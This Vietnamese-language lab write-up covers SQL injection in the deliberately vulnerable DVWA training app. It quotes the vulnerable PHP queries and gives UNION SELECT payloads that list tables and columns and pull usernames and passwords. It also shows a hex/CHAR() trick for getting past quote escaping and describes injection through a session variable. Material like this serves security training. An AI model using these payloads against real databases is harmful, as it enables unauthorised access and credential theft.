<img width="599" height="273" alt="image" src="https://github.com/user-attachments/assets/4262f33e-5dbe-42d2-bf1c-8b37e744e79a" /># SQL Injection in DVWA

Mức độ: **LOW**, **MEDIUM**, **HIGH**

---

## 🔹 LEVEL: LOW

### 📌 Description:
<img width="605" height="164" alt="image" src="https://github.com/user-attachments/assets/446e0272-30ec-4fba-9baf-4fee24152eb6" />

Lab cung cấp một trường nhập `ID` của người dùng, và kết quả trả về gồm:

- `ID`
- `First name`
- `Surname`

  <img width="387" height="143" alt="image" src="https://github.com/user-attachments/assets/82fcd3ca-6573-4949-8737-6cf3703f6472" />


---

### 🎯 Goals:
Trích xuất nhiều thông tin hơn từ database.

---

### 🔍 Phân tích:
Lab cung cấp source code với câu lệnh:

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"
```

→ Không xử lý đầu vào → dễ bị SQLi.

---

### 🧪 Khai thác:

- Liệt kê tên bảng:
```sql
1' UNION SELECT NULL, table_name FROM information_schema.tables#
```
<img width="406" height="656" alt="image" src="https://github.com/user-attachments/assets/25cc8013-fa05-4ae9-b01e-d8ce69e2261f" />

- Liệt kê tên cột trong bảng `users`:
```sql
1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'#
```
<img width="611" height="555" alt="image" src="https://github.com/user-attachments/assets/a68638d2-80fd-4818-9ef6-5d18c928d004" />

- Lấy user và password:
```sql
1' UNION SELECT user, password FROM users#
```
<img width="517" height="448" alt="image" src="https://github.com/user-attachments/assets/893024cd-b0ca-4c9e-8f71-54e70dea5c8f" />

---

## 🔸 LEVEL: MEDIUM

### 🔍 Phân tích:

```php
SELECT first_name, last_name FROM users WHERE user_id = $id;
```
<img width="590" height="95" alt="image" src="https://github.com/user-attachments/assets/82684816-6d8d-4226-8066-f4e4cae35107" />

<img width="607" height="146" alt="image" src="https://github.com/user-attachments/assets/18c0f7ac-a44b-4a81-aeed-2e2361eadf70" />

- Biến `$id` được lọc trước khi vào query.
- Nếu có ký tự đặc biệt (`'`, `"`, `--`, v.v.) → bị chèn dấu `/` escape → gây lỗi cú pháp.
- Giao diện chỉ cho nhập số, nhưng có thể sửa request bằng **Burp Suite** để chèn payload.

---

### 💡 Bypass:

- Liệt kê bảng:
```sql
1 UNION SELECT NULL, table_name FROM information_schema#
```
<img width="609" height="383" alt="image" src="https://github.com/user-attachments/assets/7055ba6b-8116-40b5-9468-6677b37a740f" />

- Liệt kê cột bảng `users` (tránh dùng `'users'` vì có `'`):
  - Dùng hex:
    ```sql
    0x7573657273
    ```
  - Dùng `CHAR()`:
    ```sql
    CHAR(117,115,101,114,115)
    ```

→ Payload hoàn chỉnh:
```sql
1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)#
```
<img width="604" height="595" alt="image" src="https://github.com/user-attachments/assets/b0bdca13-bd4c-4b89-becf-21d7ed9ff13b" />

---

## 🔺 LEVEL: HIGH

### 🔍 Phân tích:

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

- Không lấy `id` trực tiếp từ POST/GET nữa, mà từ **session**
- Trang nhập ID riêng, sau đó gán vào session và chuyển hướng tới trang xử lý

<img width="600" height="105" alt="image" src="https://github.com/user-attachments/assets/66e66242-50c5-465f-aed8-76b14cc06747" />


---

### 💡 Khai thác:

- Nếu input ban đầu (trước khi gán vào session) **không bị lọc** → ta có thể **inject như ở level LOW**
- Sau đó khi server dùng session để tạo query → payload sẽ được thực thi

<img width="599" height="273" alt="image" src="https://github.com/user-attachments/assets/0e076aa1-26c0-45d4-9ad9-e03e04775d17" />

---

### ✅ Nhận xét:
- Logic giống level LOW
- Nhưng injection xảy ra **từ trước**, thông qua session
- > 💬 *P/S: Level HIGH mà còn dễ hơn cả MEDIUM thật khó hiểu :vv*
